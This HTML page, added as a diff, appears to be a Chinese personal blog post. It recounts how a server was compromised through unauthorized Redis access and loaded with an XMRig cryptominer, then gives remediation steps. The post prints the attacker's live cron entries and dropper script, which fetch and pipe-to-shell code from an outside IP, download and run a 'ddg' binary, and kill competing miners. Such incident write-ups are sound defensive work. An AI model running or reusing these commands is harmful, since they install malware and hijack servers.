@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta name="keywords" content="hexo,个人博客,blog">
+  <meta name="description" content="夕枫主的个人博客">
+  <meta http-equiv="x-dns-prefetch-control" content="on">
+  <link rel="dns-prefetch" href="https://busuanzi.ibruce.info">
+  <link rel="dns-prefetch" href="https://at.alicdn.com">
+  
+  <link rel="dns-prefetch" href="https://hm.baidu.com/">
+  
+  <link rel="stylesheet" type="text/css" href="/./style/main.css">
+	<link rel="shortcut icon" href="/favicon.ico" title="Favicon">
+	<title>服务器被植入挖矿程序</title>
+  
+  <script>var _hmt=_hmt||[];(function(){var hm=document.createElement("script");hm.src="https://hm.baidu.com/hm.js?13ace7420ed32982b3d47c6bb20e6f0e";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm,s);})();
+  </script>
+  
+</head>
+<body>
+  <canvas id="pattern-placeholder" height="230"></canvas>
+<div class="navbar-header">
+  <a class="blog-title" href="/">夕枫主‘s Blog</a>
+  <a class="face-img" href="/">
+    <img src="https://s.gravatar.com/avatar/78f2986278ac96cbd773a91a7599604a?s=150">
+  </a>
+</div>
+<main>
+  <div class="article-title">
+    
+  
+  <h1 class="title">
+    服务器被植入挖矿程序
+  </h1>
+  
+
+
+    <ul class="article-info">
+      <li>
+        发布
+        <time datetime="2017-11-29T06:23:25.000Z" itemprop="datePublished">2017-11-29</time>
+      </li>
+      <li>
+        
+    更新 <time datetime="2019-08-04T03:40:35.845Z" itemprop="dateUpdated">2019-08-04</time>
+
+      </li>
+      <li id="busuanzi_container_page_pv">
+        阅读 <span id="busuanzi_value_page_pv"></span>
+      </li>
+    </ul>
+  </div>
+  <div class="container">
+    <div class="article">
+      <div class="content">
+        
+        <p>服务器被植入挖矿程序</p>
+<h2 id="事件简介"><a href="#事件简介" class="headerlink" title="事件简介"></a>事件简介</h2><p>  服务器遭遇入侵，入侵者通过 Redis 未授权访问缺陷，植入挖矿程序</p>
+<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>  Redis 未授权访问缺陷可轻易导致系统被黑</p>
+<h2 id="经过"><a href="#经过" class="headerlink" title="经过"></a>经过</h2><p>执行 <code>htop</code> 发现异常进程</p>
+<p><img src="https://user-images.githubusercontent.com/4188624/32473483-512966e0-c32d-11e7-842e-f76b7b0558c8.png" alt="1__deployer_VM-117-230-ubuntu___var_lib_postgresql_9_3_main__ssh_.png"></p>
+<p>查看异常进程信息 <code>sudo ls -al /proc/25461</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">dr-xr-xr-x   9 deployer postgres 0 Nov  6 13:15 .</span><br><span class="line">dr-xr-xr-x 193 root     root     0 Aug 19 12:05 ..</span><br><span class="line">dr-xr-xr-x   2 deployer postgres 0 Nov  6 13:15 attr</span><br><span class="line">-rw-r--r--   1 deployer postgres 0 Nov  6 13:15 autogroup</span><br><span class="line">-r--------   1 deployer postgres 0 Nov  6 13:15 auxv</span><br><span class="line">-r--r--r--   1 deployer postgres 0 Nov  6 13:15 cgroup</span><br><span class="line">--w-------   1 deployer postgres 0 Nov  6 13:15 clear_refs</span><br><span class="line">-r--r--r--   1 deployer postgres 0 Nov  6 13:15 cmdline</span><br><span class="line">-rw-r--r--   1 deployer postgres 0 Nov  6 13:15 comm</span><br><span class="line">-rw-r--r--   1 deployer postgres 0 Nov  6 13:15 coredump_filter</span><br><span class="line">-r--r--r--   1 deployer postgres 0 Nov  6 13:15 cpuset</span><br><span class="line">lrwxrwxrwx   1 deployer postgres 0 Nov  6 13:15 cwd -&gt; /</span><br><span class="line">-r--------   1 deployer postgres 0 Nov  6 13:15 environ</span><br><span class="line">lrwxrwxrwx   1 deployer postgres 0 Nov  6 13:15 exe -&gt; /var/lib/postgresql/9.3/main/x3776026004</span><br><span class="line">dr-x------   2 deployer postgres 0 Nov  6 13:15 fd</span><br><span class="line">dr-x------   2 deployer postgres 0 Nov  6 13:15 fdinfo</span><br><span class="line">-rw-r--r--   1 deployer postgres 0 Nov  6 13:15 gid_map</span><br><span class="line">-r--------   1 deployer postgres 0 Nov  6 13:15 io</span><br><span class="line">-r--r--r--   1 deployer postgres 0 Nov  6 13:15 latency</span><br><span class="line">-r--r--r--   1 deployer postgres 0 Nov  6 13:15 limits</span><br><span class="line">-rw-r--r--   1 deployer postgres 0 Nov  6 13:15 loginuid</span><br><span class="line">dr-x------   2 deployer postgres 0 Nov  6 13:15 map_files</span><br><span class="line">-r--r--r--   1 deployer postgres 0 Nov  6 13:15 maps</span><br><span class="line">-rw-------   1 deployer postgres 0 Nov  6 13:15 mem</span><br><span class="line">-r--r--r--   1 deployer postgres 0 Nov  6 13:15 mountinfo</span><br><span class="line">-r--r--r--   1 deployer postgres 0 Nov  6 13:15 mounts</span><br><span class="line">-r--------   1 deployer postgres 0 Nov  6 13:15 mountstats</span><br><span class="line">dr-xr-xr-x   5 deployer postgres 0 Nov  6 13:15 net</span><br><span class="line">dr-x--x--x   2 deployer postgres 0 Nov  6 13:15 ns</span><br><span class="line">-r--r--r--   1 deployer postgres 0 Nov  6 13:15 numa_maps</span><br><span class="line">-rw-r--r--   1 deployer postgres 0 Nov  6 13:15 oom_adj</span><br><span class="line">-r--r--r--   1 deployer postgres 0 Nov  6 13:15 oom_score</span><br><span class="line">-rw-r--r--   1 deployer postgres 0 Nov  6 13:15 oom_score_adj</span><br><span class="line">-r--r--r--   1 deployer postgres 0 Nov  6 13:15 pagemap</span><br><span class="line">-r--r--r--   1 deployer postgres 0 Nov  6 13:15 personality</span><br><span class="line">-rw-r--r--   1 deployer postgres 0 Nov  6 13:15 projid_map</span><br><span class="line">lrwxrwxrwx   1 deployer postgres 0 Nov  6 13:15 root -&gt; /</span><br><span class="line">-rw-r--r--   1 deployer postgres 0 Nov  6 13:15 sched</span><br><span class="line">-r--r--r--   1 deployer postgres 0 Nov  6 13:15 schedstat</span><br><span class="line">-r--r--r--   1 deployer postgres 0 Nov  6 13:15 sessionid</span><br><span class="line">-r--r--r--   1 deployer postgres 0 Nov  6 13:15 smaps</span><br><span class="line">-r--r--r--   1 deployer postgres 0 Nov  6 13:15 stack</span><br><span class="line">-r--r--r--   1 deployer postgres 0 Nov  6 13:15 stat</span><br><span class="line">-r--r--r--   1 deployer postgres 0 Nov  6 13:15 statm</span><br><span class="line">-r--r--r--   1 deployer postgres 0 Nov  6 13:15 status</span><br><span class="line">-r--r--r--   1 deployer postgres 0 Nov  6 13:15 syscall</span><br><span class="line">dr-xr-xr-x  13 deployer postgres 0 Nov  6 13:15 task</span><br><span class="line">-r--r--r--   1 deployer postgres 0 Nov  6 13:15 timers</span><br><span class="line">-rw-r--r--   1 deployer postgres 0 Nov  6 13:15 uid_map</span><br><span class="line">-r--r--r--   1 deployer postgres 0 Nov  6 13:15 wchan</span><br></pre></td></tr></table></figure>
+
+<p>发现异常进程<code>exe -&gt; /var/lib/postgresql/9.3/main/x3776026004</code> 查看 pg 目录 <code>/var/lib/postgresql/9.3/main</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">drwx------ 15 deployer postgres    4096 Oct 23 04:33 ./</span><br><span class="line">drwxr-xr-x  3 deployer postgres    4096 Aug 16  2016 ../</span><br><span class="line">drwx------  6 deployer postgres    4096 Aug 30 17:53 base/</span><br><span class="line">drwx------  2 deployer postgres    4096 Sep  5 16:08 global/</span><br><span class="line">drwx------  2 deployer postgres    4096 Aug 16  2016 pg_clog/</span><br><span class="line">drwx------  4 deployer postgres    4096 Aug 16  2016 pg_multixact/</span><br><span class="line">drwx------  2 deployer postgres    4096 Aug 30 18:13 pg_notify/</span><br><span class="line">drwx------  2 deployer postgres    4096 Aug 16  2016 pg_serial/</span><br><span class="line">drwx------  2 deployer postgres    4096 Aug 16  2016 pg_snapshots/</span><br><span class="line">drwx------  2 deployer postgres    4096 Aug 30 18:13 pg_stat/</span><br><span class="line">drwx------  2 deployer postgres    4096 Nov  6 12:19 pg_stat_tmp/</span><br><span class="line">drwx------  2 deployer postgres    4096 Aug 16  2016 pg_subtrans/</span><br><span class="line">drwx------  2 deployer postgres    4096 Aug 16  2016 pg_tblspc/</span><br><span class="line">drwx------  2 deployer postgres    4096 Aug 16  2016 pg_twophase/</span><br><span class="line">-rw-------  1 deployer postgres       4 Aug 16  2016 PG_VERSION</span><br><span class="line">drwx------  3 deployer postgres    4096 Aug 16  2016 pg_xlog/</span><br><span class="line">-rw-------  1 deployer postgres     133 Aug 30 18:13 postmaster.opts</span><br><span class="line">-rw-------  1 deployer postgres      93 Aug 30 18:13 postmaster.pid</span><br><span class="line">-rwxrwxrwx  1 deployer postgres   14480 Oct 13 10:06 ps3767604655*</span><br><span class="line">-rw-r--r--  1 deployer postgres   15360 Oct 12 03:58 vcredist_x64_1130.dll</span><br><span class="line">-rw-r--r--  1 deployer postgres  100352 Oct 13 04:52 vcredist_x64_2191.dll</span><br><span class="line">-rw-r--r--  1 deployer postgres   15360 Oct 12 08:50 vcredist_x64_5569.dll</span><br><span class="line">-rw-r--r--  1 deployer postgres  100352 Oct 23 04:33 vcredist_x64_6375.dll</span><br><span class="line">-rw-r--r--  1 deployer postgres  100352 Oct 16 05:12 vcredist_x64_8544.dll</span><br><span class="line">-rw-r--r--  1 deployer postgres   11264 Oct 12 03:58 vcredist_x86_1071.dll</span><br><span class="line">-rw-r--r--  1 deployer postgres   11264 Oct 12 08:50 vcredist_x86_5380.dll</span><br><span class="line">-rw-r--r--  1 deployer postgres   81408 Oct 23 04:33 vcredist_x86_7537.dll</span><br><span class="line">-rw-r--r--  1 deployer postgres   81408 Oct 13 04:52 vcredist_x86_9105.dll</span><br><span class="line">-rw-r--r--  1 deployer postgres   81408 Oct 16 05:12 vcredist_x86_928.dll</span><br><span class="line">-rwxrwxrwx  1 deployer postgres  496464 Oct 13 10:06 x3776026004*</span><br><span class="line">-rw-------  1 deployer postgres 4676439 Nov  6 12:19 xmr.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>恶意程序（<code>x3776026004</code>）植入时间为 2017年10月13号10：06分</strong></p>
+<p>查看 <code>xmr.txt</code> 文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[2017-10-13 10:06:31]  * VERSIONS:     XMRig/2.3.1-dev libuv/1.9.1 gcc/6.3.0</span><br><span class="line">[2017-10-13 10:06:31]  * HUGE PAGES:   available, disabled</span><br><span class="line">[2017-10-13 10:06:31]  * CPU:          Intel(R) Xeon(R) CPU E5-26xx v3 (1) x64 AES-NI</span><br><span class="line">[2017-10-13 10:06:31]  * CPU L2/L3:    24.0 MB/0.0 MB</span><br><span class="line">[2017-10-13 10:06:31]  * THREADS:      6, cryptonight, av=1, donate=0%</span><br><span class="line">[2017-10-13 10:06:31]  * POOL #1:      xmr.crypto-pool.fr:80</span><br><span class="line">[2017-10-13 10:06:31]  * COMMANDS:     'h' hashrate, 'p' pause, 'r' resume</span><br><span class="line">[2017-10-13 10:06:31] use pool xmr.crypto-pool.fr:80 163.172.226.114</span><br><span class="line">[2017-10-13 10:06:31] new job from xmr.crypto-pool.fr:80 diff 50000</span><br><span class="line">[2017-10-13 10:06:37] new job from xmr.crypto-pool.fr:80 diff 50000</span><br><span class="line">[2017-10-13 10:06:47] new job from xmr.crypto-pool.fr:80 diff 50000</span><br></pre></td></tr></table></figure>
+
+<p>访问地址 <code>xmr.crypto-pool.fr</code></p>
+<p><img src="https://user-images.githubusercontent.com/4188624/32473858-42dc9ed4-c32f-11e7-9e9c-822021dc38f4.png" alt="xmr_crypto-pool_fr"></p>
+<p><strong>这个恶意程序为一个是挖矿程序</strong></p>
+<p>检查 <code>/var/spool/cron/crontabs/</code><br>发现有定时任务执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*/1 * * * * curl -L http://218.248.40.228:8443/i.sh | sh</span><br><span class="line">*/1 * * * * wget -q http://218.248.40.228:8443/i.sh -O - | sh</span><br></pre></td></tr></table></figure>
+
+<p>恶意代码如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin</span><br><span class="line">echo "*/5 * * * * curl -fsSL http://218.248.40.228:8443/i.sh | sh" &gt; /var/spool/cron/root</span><br><span class="line">echo "*/5 * * * * wget -q -O- http://218.248.40.228:8443/i.sh | sh" &gt;&gt; /var/spool/cron/root</span><br><span class="line">mkdir -p /var/spool/cron/crontabs</span><br><span class="line">echo "*/5 * * * * curl -fsSL http://218.248.40.228:8443/i.sh | sh" &gt; /var/spool/cron/crontabs/root</span><br><span class="line">echo "*/5 * * * * wget -q -O- http://218.248.40.228:8443/i.sh | sh" &gt;&gt; /var/spool/cron/crontabs/root</span><br><span class="line">if [ ! -f "/tmp/ddg.2020" ]; then</span><br><span class="line">    curl -fsSL http://218.248.40.228:8443/2020/ddg.$(uname -m) -o /tmp/ddg.2020</span><br><span class="line">fi</span><br><span class="line">if [ ! -f "/tmp/ddg.2020" ]; then</span><br><span class="line">    wget -q http://218.248.40.228:8443/2020/ddg.$(uname -m) -O /tmp/ddg.2020</span><br><span class="line">fi</span><br><span class="line">chmod +x /tmp/ddg.2020 &amp;&amp; /tmp/ddg.2020</span><br><span class="line">ps auxf | grep -v grep | grep Circle_MI | awk '&#123;print $2&#125;' | xargs kill</span><br><span class="line">ps auxf | grep -v grep | grep get.bi-chi.com | awk '&#123;print $2&#125;' | xargs kill</span><br><span class="line">ps auxf | grep -v grep | grep /boot/efi/ | awk '&#123;print $2&#125;' | xargs kill</span><br><span class="line"><span class="meta">#</span><span class="bash">ps auxf | grep -v grep | grep ddg.2006 | awk <span class="string">'&#123;print $2&#125;'</span> | <span class="built_in">kill</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">ps auxf | grep -v grep | grep ddg.2010 | awk <span class="string">'&#123;print $2&#125;'</span> | <span class="built_in">kill</span></span></span><br></pre></td></tr></table></figure>
+
+<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><ol>
+<li>关闭访问挖矿服务器的访问 <code>iptables -A INPUT -s xmr.crypto-pool.fr -j DROP</code> and <code>iptables -A OUTPUT -d xmr.crypto-pool.fr -j DROP</code></li>
+<li>检查 <code>crontab</code> 中的定时任务，删除恶意定时任务</li>
+<li>杀掉挖矿程序，并清除恶意程序</li>
+<li>配置 <code>bind</code> 选项, 限定可以连接 <code>Redis</code> 服务器的 <code>IP</code>, 并修改 <code>redis</code> 的默认端口6379, 配置rename-command 配置项</li>
+<li>查找 <code>/tmp</code> 目录是否有发现可以文件，找到并且清除</li>
+<li>打开 <code>~/.ssh/authorized_keys</code>, 删除你不认识的账号</li>
+<li>所有操作完成之后，记得再次使用 <code>htop</code> 观察一段时间，确保挖矿守护进程已经干掉，挖矿程序没有重新启动服务</li>
+</ol>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a href="http://www.chinaz.com/server/2015/1112/469670.shtml" target="_blank" rel="noopener">http://www.chinaz.com/server/2015/1112/469670.shtml</a></li>
+<li><a href="http://53cto.blog.51cto.com/9899631/1826989" target="_blank" rel="noopener">http://53cto.blog.51cto.com/9899631/1826989</a></li>
+</ul>
+
+      </div>
+        <div class="support-author">
+          <p>感谢您的阅读。 🙏
+            <!--<a class="btn-pay" href="#pay-modal">¥ 打赏支持</a> -->
+          </p>
+        </div>
+        <!--
+            <div class="like ">
+              <div class="like-button">
+                <a id="like-note" href="">
+                  <i class="icon-heart"></i>喜欢
+                </a>
+              </div>
+              <span id="likes-count">256</span>
+            </div>
+        -->
+        <div class="otherLink">
+          <div class="previous">
+          </div>
+          <div class="next">
+          </div>
+        </div>
+        <div class="comments" id="comments">
+          <script type="text/javascript">
+  /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+  var disqus_shortname = 'xifengzhu'; // required: replace example with your forum shortname
+
+  /* * * DON'T EDIT BELOW THIS LINE * * */
+  (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+<div class="container">
+  <div id="disqus_thread"></div>
+<div>
+
+        </div>
+      </div>
+    </div>
+   </div>
+</div></main>
+<div class="footer">
+  <div class="info">
+    <p>
+    <a href="https://hexo.io"> Hexo </a> 强力驱动 |
+      <a href="https://github.com/Youthink/hexo-themes-yearn"> Yearn </a>
+      主题
+    </p>
+    <p>&copy; </p>
+  </div>
+</div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script>//console
+  var consoleConfig = ''.split(',');
+  var canConsole = false;
+  var consoleInfo = (function(consoleConfig) {
+  if (!canConsole || !consoleConfig || consoleConfig.length < 1) {
+    return;
+  }
+  var consoleColor = '#6190e8';
+  var _console;
+  var backgroundTextStyle = 'padding: 1px 5px;color: #fff;background: ' + consoleColor + ';'
+  var textStyle = 'color: ' + consoleColor + ';';
+
+  consoleConfig.map(o => {
+    var num = (o.match(/%c/g) || []).length;
+    if(/^http(s)?:\/\//.test(o)) {
+      console.log('%c     ', 'background: url(' + o + ') no-repeat left center;font-size: 180px;');
+      return;
+    }
+    if (num > 0) {
+      var logArguments = [];
+      for (var i = 0; i < num; i++) {
+        if (i % 2 === 0) {
+          logArguments.push(backgroundTextStyle);
+        } else {
+          logArguments.push(textStyle);
+        }
+      }
+      (_console = console).log.apply(_console, ['%c' + o, textStyle].concat(logArguments));
+      return;
+    }
+    console.log('%c' + o, textStyle);
+  });
+}(consoleConfig));</script><script type="text/javascript" src="/./js/main.js"></script>
+
+  <script src="//at.alicdn.com/t/font_159214_mvtxvg9me9.js"></script>
+</body>
+</html>
+
+
